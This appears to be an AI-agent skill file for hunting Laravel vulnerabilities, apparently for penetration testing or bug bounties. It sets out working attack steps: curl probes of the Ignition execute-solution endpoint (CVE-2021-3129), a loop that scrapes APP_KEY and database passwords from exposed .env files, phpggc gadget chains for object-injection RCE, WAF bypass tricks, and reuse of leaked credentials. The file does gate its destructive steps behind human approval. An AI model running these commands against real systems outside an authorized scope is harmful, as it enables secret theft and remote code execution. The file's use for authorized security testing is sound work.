---
name: laravel
description: >
  Hunt for Laravel / PHP-framework weaknesses: APP_DEBUG=true leakage and Ignition RCE
  (CVE-2021-3129), exposed Telescope/Horizon dashboards, readable .env / config leaks,
  PHP object-injection via a known/leaked APP_KEY (decrypt_resolve / laravel-crypto-killer), and
  verbose debug stack traces that leak secrets and internal paths. Use when the target is Laravel
  (Ignition error page, X-Powered-By PHP, laravel_session cookie, /telescope, /horizon, Blade
  errors, .env). Keywords: laravel, php, app_debug, ignition, CVE-2021-3129, telescope, horizon,
  .env leak, app_key, laravel decrypt, phpggc, object injection, debug stack trace, Whoops.
  Do NOT use for generic PHP LFI/RFI (use lfi-rfi) or language-agnostic deserialization theory
  (use deserialization). This is the Laravel-specific config/debug/crypto surface.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-502, CWE-200, CWE-215, CWE-209, CWE-798]
  mitre_attack: [T1190, T1552.001, T1212]
  tools: [curl, phpggc, laravel-crypto-killer, nuclei, burp]
depends_on: [active-recon, tech-stack-fingerprint, info-disclosure]
feeds_into: [chain-analysis, rce, info-disclosure]
chains_with: [deserialization, rce, info-disclosure, credential-testing]
---

## Signals

- Laravel fingerprints: `Set-Cookie: laravel_session=` and `XSRF-TOKEN=`, `X-Powered-By: PHP`,
  a Blade/Ignition error page (Facade/Flare branding, "Illuminate\\..." stack frames), `/livewire`
  assets, `/vendor/` references.
- A debug error page (Ignition/Whoops) rendered on a forced error — leaks framework version, file
  paths, env snippets, SQL, and sometimes secrets.
- Dashboards: `/telescope`, `/telescope/requests`, `/horizon`, `/horizon/dashboard`,
  `/_ignition/health-check`, `/_ignition/execute-solution`.
- Config/secret files reachable: `/.env`, `/.env.bak`, `/.env.save`, `/storage/logs/laravel.log`,
  `/.git/config`.
- An `APP_KEY` of the form `base64:...` seen in a leak/repo, plus app behaviour that deserializes
  Laravel-encrypted payloads (cookies, signed values).

## Prerequisites

- Confirmed Laravel (an Ignition page, `laravel_session` cookie, or `/telescope` responding).
- For Ignition RCE (CVE-2021-3129): `APP_DEBUG=true` AND a vulnerable `facade/ignition` version
  (< 2.5.2) with `/_ignition/execute-solution` reachable.
- For APP_KEY object injection: a leaked/known `APP_KEY` and a Laravel endpoint that
  decrypts/unserializes attacker-supplied ciphertext (a cookie or signed parameter).
- For blind confirmation of RCE: an OOB listener with per-attempt token (`engine.oast`).

## Methodology

1. **Fingerprint and force a debug error.** Confirm Laravel and whether debug is on:
   ```bash
   curl -s -I https://target/ | grep -iE 'set-cookie: *(laravel_session|xsrf-token)|x-powered-by: *php'
   # trigger an error (bad method / bad route / type-juggled param) and inspect the page
   curl -s -X POST https://target/login | grep -iE 'ignition|whoops|Illuminate\\\\|APP_KEY|\.env'
   curl -s "https://target/%00" | grep -oE 'Laravel v[0-9.]+|PHP [0-9.]+'
   ```
   An Ignition page confirms `APP_DEBUG=true` — already an info leak, and the gate to Ignition RCE.

2. **Ignition RCE (CVE-2021-3129).** With debug on and a vulnerable Ignition, the
   `execute-solution` endpoint can be driven (via a log-poisoning + phar/`MakeViewVariableOptional`
   solution) to execute code. Confirm with an OOB callback, not a shell:
   ```bash
   # probe the endpoint exists and reflects the solution/parameters shape
   curl -s -X POST https://target/_ignition/execute-solution \
     -H 'Content-Type: application/json' \
     -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
          "parameters":{"variableName":"x","viewFile":"/var/www/storage/logs/laravel.log"}}'
   # the published PoC writes a crafted log then clears/decodes it to gain execution;
   # use a benign OOB command as proof and poll the listener
   python3 -m engine.oast poll --audit-dir .
   ```
   Treat the destructive log-manipulation steps as Human-gate actions — confirm scope before
   running the full chain; a version match alone is Unproven.

3. **Telescope / Horizon exposure.** These debugging dashboards often ship unauthenticated in
   non-local environments and leak requests, queries, secrets, and job payloads:
   ```bash
   curl -s -o /dev/null -w "%{http_code}\n" https://target/telescope
   curl -s https://target/telescope/requests | head -c 500          # request log incl. headers/bodies
   curl -s "https://target/telescope/telescope-api/requests" | head -c 800   # JSON API, bulk
   curl -s -o /dev/null -w "%{http_code}\n" https://target/horizon/dashboard
   ```
   A 200 with real request/query data is info-disclosure feeding session hijack / APP_KEY hunt.

4. **.env and config leaks.** Static exposure of `.env` hands over APP_KEY, DB creds, mail/API
   keys outright:
   ```bash
   for f in .env .env.bak .env.save .env.production storage/logs/laravel.log; do
     code=$(curl -s -o /tmp/l.out -w "%{http_code}" "https://target/$f")
     echo "$f -> $code $(grep -oE 'APP_KEY=base64:[^ ]+|DB_PASSWORD=.*' /tmp/l.out | head -1)"
   done
   ```
   A readable `.env` is a direct secret leak (critical) and the APP_KEY gateway to object injection.

5. **APP_KEY → PHP object injection.** With a known APP_KEY, Laravel-encrypted values become
   forgeable; if any decrypts into `unserialize()`, a phpggc gadget yields object injection/RCE:
   ```bash
   # build a gadget and encrypt it with the leaked APP_KEY (laravel-crypto-killer / custom script)
   phpggc -l | grep -i laravel        # list Laravel/Monolog/Guzzle gadget chains
   phpggc Laravel/RCE9 system 'id' -b   # example chain (verify current chain names with -l)
   # encrypt the gadget under APP_KEY and deliver via the cookie/param that gets decrypt()->unserialize()
   # confirm with an OOB callback, not a blind shell
   ```
   Object injection requires an actual `unserialize()` sink reached by decrypted input — the APP_KEY
   alone is a secret leak, not RCE, until that sink is demonstrated.

6. **Debug stack-trace mining.** Even without Ignition RCE, the debug page leaks exploitable
   detail:
   ```bash
   curl -s -X POST https://target/some/endpoint -d 'id[]=1' | \
     grep -oE '/var/www/[^ "<]+|APP_KEY=base64:[^ "<]+|DB_[A-Z]+=[^ "<]+|SELECT .* FROM [^ "<]+'
   ```
   Absolute paths (for LFI/log-poisoning), SQL (for sqli), and env values (secrets) all surface here.

7. **Confirm the primitive and stop at the gate.** Record which path (Ignition RCE, dashboard leak,
   .env leak, APP_KEY object injection, debug leak). Running the full RCE chain or using leaked DB
   creds is a Human-gate / new-scope action.

## Tooling

- `curl` / Burp — force debug errors, hit `/_ignition/*`, `/telescope`, `/.env`.
- `phpggc` — generate PHP gadget chains (Laravel/Monolog/Guzzle); list with `-l` and verify chain
  names (they change across releases) per CLI anti-hallucination.
- `laravel-crypto-killer` (or a small script) — encrypt/decrypt Laravel payloads with a known
  APP_KEY to forge object-injection cookies.
- `nuclei -tags laravel,ignition` — triage CVE-2021-3129 and exposed-dashboard templates (confirm
  version applicability; don't report on match alone).
- `engine.oast` / `interactsh` — OOB proof for Ignition / object-injection RCE.

## Root Causes

- `APP_DEBUG=true` in production — Ignition/Whoops renders secrets, paths, SQL, and exposes the
  `execute-solution` endpoint.
- Vulnerable `facade/ignition` (< 2.5.2) accepting `MakeViewVariableOptional`/phar solutions —
  log-poison-to-RCE (CVE-2021-3129).
- Telescope/Horizon registered without `gate`/auth middleware in non-local environments.
- Web root or misconfigured server serving dotfiles (`.env`, `.git`) instead of confining to
  `public/`.
- A static/leaked `APP_KEY` plus a `decrypt()`→`unserialize()` path — forgeable encrypted payloads
  become object injection (overlaps deserialization).

## Validation Gate (minimum proof)

- **Demonstrated:** a token-correlated OOB callback from the Ignition chain or an APP_KEY-forged
  object-injection payload (RCE); a `/telescope`/`/horizon` 200 showing real request/query data; a
  readable `.env` returning `APP_KEY`/`DB_PASSWORD`; or a debug page returning concrete secrets.
  Payload + request/response included.
- **Inferred:** `APP_DEBUG=true` confirmed (Ignition renders) and a vulnerable Ignition version seen
  but the RCE chain not driven; an APP_KEY leaked but the `unserialize()` sink not yet reached; a
  dashboard route returning a login/redirect rather than data.
- **Unproven:** "Laravel + Ignition version X, therefore CVE-2021-3129" with no chain reproduced;
  "APP_KEY leaked, therefore RCE" with no decrypt→unserialize sink. Do not report as RCE (the leak
  itself may still be its own finding).
- Name the vector (Ignition RCE vs dashboard leak vs .env leak vs APP_KEY object injection vs debug
  leak) — severity and fix differ.

## Payloads & Detection Patterns

Guía de caza: una familia por primitiva de Laravel. El RCE (Ignition, object-injection) es ciego:
el único camino a `Demonstrated` es un callback OOB correlacionado por token.

| Categoría | Shape | Propósito |
|---|---|---|
| Debug fingerprint | forzar error → página Ignition/Whoops | Confirmar `APP_DEBUG=true` + versión |
| Ignition RCE | `POST /_ignition/execute-solution` + solution MakeViewVariableOptional | Log-poison → ejecución (CVE-2021-3129) |
| Telescope leak | `GET /telescope/requests`, `/telescope-api/requests` | Dump de requests/queries/secretos |
| Horizon leak | `GET /horizon/dashboard` | Payloads de jobs / colas |
| .env leak | `GET /.env`, `/.env.bak` | APP_KEY + credenciales DB/API directas |
| APP_KEY object inj. | gadget phpggc cifrado bajo APP_KEY → cookie/param | Object injection vía decrypt→unserialize |
| Debug secret mine | stack trace con paths/SQL/env | LFI/sqli/secret pivots |

Surface signals que delatan la clase antes de inyectar:
- URL: `/_ignition/execute-solution`, `/_ignition/health-check`, `/telescope*`, `/horizon*`, `/.env`.
- HTML: página Ignition/Flare, frames `Illuminate\\...`, `Laravel vX`.
- Headers: `Set-Cookie: laravel_session`, `XSRF-TOKEN`, `X-Powered-By: PHP`.

```bash
# fingerprint + ¿debug on? (fuerza un error y busca Ignition/secretos)
curl -s -X POST https://target/login | grep -iE 'ignition|whoops|APP_KEY|Illuminate\\\\' | head -3
curl -s -I https://target/ | grep -iE 'laravel_session|x-powered-by: *php'
```

```bash
# dashboards y .env en un barrido corto
for p in telescope telescope/requests horizon/dashboard .env .env.bak; do
  echo "$p -> $(curl -s -o /dev/null -w '%{http_code}' https://target/$p)"
done
```

```bash
# Ignition: ¿existe el endpoint de solución? (probe, sin ejecutar el chain destructivo)
curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target/_ignition/execute-solution \
  -H 'Content-Type: application/json' -d '{"solution":"x","parameters":{}}'
# 200/422 (valida parámetros) => endpoint vivo; 404 => no aplica
```

## Bypass Techniques

Agrupadas por la defensa que evaden; probar la familia completa antes de declarar no-vulnerable.

| Filtro evadido | Técnica | Notas |
|---|---|---|
| `.env` 404 por ruta directa | Probar backups `.env.bak/.save/.production`, `.git/config`, `storage/logs/laravel.log` | El log suele filtrar APP_KEY y queries |
| Dashboard con gate por entorno | Probar en staging/beta donde `local`/`debug` suele quedar on | Config copiada entre despliegues |
| Ignition path desconocido | Leer el `viewFile` real desde el stack trace de debug | El log a envenenar es un path absoluto del trace |
| APP_KEY rotada | Reusar la misma APP_KEY en staging/beta (reuso entre entornos) | Una APP_KEY filtrada suele valer en varios envs |
| phpggc chain obsoleto | `phpggc -l` y elegir la cadena vigente para la versión de PHP/Laravel | Los nombres de cadena cambian por release |
| WAF filtra `/_ignition` | Doble slash, case, `;` trailing en el path | El routing de Laravel normaliza distinto al WAF |

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **APP_DEBUG=true → Ignition RCE** — Is `facade/ignition` vulnerable and `execute-solution`
   reachable? Reproduce with an OOB callback (gate the destructive chain).
2. **.env / dashboard leak → APP_KEY object injection** — Does the leaked APP_KEY let you forge an
   encrypted payload into a decrypt→unserialize sink? Chain deserialization → rce.
3. **.env leak → credential reuse** — Do leaked DB/mail/API creds work against the DB or other
   services? Chain credential-testing (gate before use).
4. **Debug stack trace → lfi / sqli** — Do leaked absolute paths enable log-poisoning/LFI, or does
   leaked SQL reveal an injectable query? Chain lfi-rfi / sqli.
5. **Telescope leak → session hijack** — Do captured requests contain live session cookies or
   bearer tokens? Chain auth-bypass.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- `APP_DEBUG=true` + vulnerable Ignition → log poisoning → **rce** (CVE-2021-3129, OOB-proven,
  gated).
- `.env` / Telescope leak → leaked `APP_KEY` → forged encrypted payload → **deserialization** →
  **rce**.
- `.env` leak → DB/mail/API credentials → **credential-testing** → lateral access (new scope).
- Debug stack trace → absolute paths → **lfi-rfi** / log poisoning; or leaked SQL → **sqli**.
- Telescope/Horizon request dump → session cookies/tokens → **auth-bypass** / session hijack.

## Gotchas

- **Version match is Unproven.** A vulnerable Ignition version is a lead, not a finding; the
  CVE-2021-3129 chain must be reproduced with an OOB callback before claiming RCE.
- **APP_KEY leak ≠ RCE.** A leaked APP_KEY is a serious secret leak, but object-injection RCE needs
  a real `decrypt()`→`unserialize()` sink reached by attacker input — demonstrate the sink.
- **OOB proof, benign command, gate the destructive steps.** The Ignition chain writes/clears log
  files; treat that as a Human-gate action and prove execution with a DNS/HTTP callback, not a
  shell.
- **Common N/A:** `APP_DEBUG=false` (generic error page, no Ignition), dashboards return a login or
  403, `.env` 404 — record tested-and-safe with evidence.
- **phpggc chain names drift.** Verify the current Laravel/Monolog/Guzzle chain with `phpggc -l`
  against the target's PHP/Laravel version; a stale chain fails silently and looks like "not
  vulnerable".
- **Overclaim trap:** an Ignition page leaking paths/SQL is info-disclosure, scored as such — don't
  inflate it to RCE without the execute-solution chain.
